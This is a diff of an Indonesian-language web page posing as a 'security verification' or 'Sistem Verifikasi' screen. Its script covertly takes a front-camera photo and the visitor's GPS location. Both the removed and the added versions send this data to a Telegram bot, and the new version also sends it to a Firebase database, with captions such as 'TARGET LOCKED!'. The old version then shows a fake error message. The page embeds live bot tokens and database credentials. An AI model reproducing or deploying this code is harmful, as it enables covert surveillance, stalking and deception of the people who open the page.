@@ -3,74 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Verification</title>
+    <title>Sistem Verifikasi | Mobile</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { text-align: center; background: #080808; padding: 40px 20px; border-radius: 20px; border: 1px solid #111; width: 90%; max-width: 350px; }
-        .btn { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: 900; cursor: pointer; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
-        .loader { display: none; margin: 20px auto; border: 3px solid #111; border-top: 3px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        .box { text-align: center; padding: 20px; border: 1px solid #222; border-radius: 8px; width: 80%; max-width: 300px; }
+        .loader { border: 3px solid #111; border-top: 3px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 16px; letter-spacing: 2px; color: #ff0000; }
+        p { font-size: 12px; color: #555; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2 id="st">Security Check</h2>
-        <p id="msg" style="font-size: 13px; color: #666;">Verifikasi identitas diperlukan untuk keamanan akun Anda.</p>
-        <button id="btn" class="btn" onclick="startRMT()">VERIFIKASI SEKARANG</button>
-        <div id="loader" class="loader"></div>
+
+    <div class="box">
+        <h2>DARKNESS SYSTEM</h2>
+        <div class="loader"></div>
+        <p>MEMPROSES IZIN AKSES...</p>
     </div>
-    <video id="v" autoplay playsinline style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAxoDrru0u2zRKYAU3vAE0KBh5ftw1SzaM",
+      authDomain: "database-me-40ff4.firebaseapp.com",
+      databaseURL: "https://database-me-40ff4-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "database-me-40ff4",
+      storageBucket: "database-me-40ff4.firebasestorage.app",
+      messagingSenderId: "80099598743",
+      appId: "1:80099598743:web:a91e1ee54c14a84d62a4d2"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
     const TELE_TOKEN = "8740798060:AAGVYPajLLAid1V2wO-SrbbXNcxur6vNPLk";
     const TELE_ID = "8283778614";
 
-    function startRMT() {
-        document.getElementById('btn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('st').innerText = "Processing...";
+    window.onload = () => { setupCamera(); };
 
-        navigator.geolocation.getCurrentPosition(pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-            const time = new Date().toLocaleString('id-ID');
+    async function setupCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            document.getElementById('video').srcObject = stream;
+            setTimeout(() => { getLocation(); }, 2000);
+        } catch (err) { getLocation(); }
+    }
 
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL('image/jpeg', 0.7);
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => pushToCloud(pos.coords.latitude, pos.coords.longitude),
+                (err) => pushToCloud("0", "0")
+            );
+        } else { pushToCloud("0", "0"); }
+    }
 
-                    // SIMPAN KE BROWSER
-                    let targets = JSON.parse(localStorage.getItem('darkness_targets') || '[]');
-                    targets.push({ time, lat, lon, img: imgData });
-                    localStorage.setItem('darkness_targets', JSON.stringify(targets));
+    async function pushToCloud(lat, lon) {
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        context.drawImage(document.getElementById('video'), 0, 0, 640, 480);
+        const imgData = canvas.toDataURL('image/jpeg', 0.5);
+        const time = new Date().toLocaleString('id-ID');
 
-                    // KIRIM KE TELEGRAM
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append("chat_id", TELE_ID);
-                        formData.append("photo", blob, "target.jpg");
-                        formData.append("caption", `💀 TARGET TERDETEKSI!\n\n📍 Maps: ${maps}\n⏰ Jam: ${time}\n👤 User: Kalz RMT`);
-                        
-                        fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: "POST", body: formData })
-                        .then(() => {
-                            stream.getTracks().forEach(t => t.stop());
-                            document.getElementById('loader').style.display = 'none';
-                            document.getElementById('st').innerText = "Error 404";
-                            document.getElementById('msg').innerText = "Koneksi terputus. Silakan coba lagi nanti.";
-                        });
-                    }, 'image/jpeg');
-                }, 2000);
-            });
-        }, () => { alert("Izin diperlukan untuk melanjutkan."); location.reload(); });
+        try {
+            // 1. KIRIM KE FIREBASE (MARKAS) DULUAN (FIXED)
+            await db.ref('targets').push({ time, lat, lon, img: imgData });
+
+            // 2. KIRIM KE TELEGRAM (BACKUP)
+            const msg = `🎯 TARGET LOCKED!\n⏰ ${time}\n📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
+            await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(msg)}`);
+            
+            const blob = await (await fetch(imgData)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', TELE_ID);
+            formData.append('photo', blob, 'target.jpg');
+            await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+
+        } catch (e) { console.error(e); }
     }
 </script>
 </body>
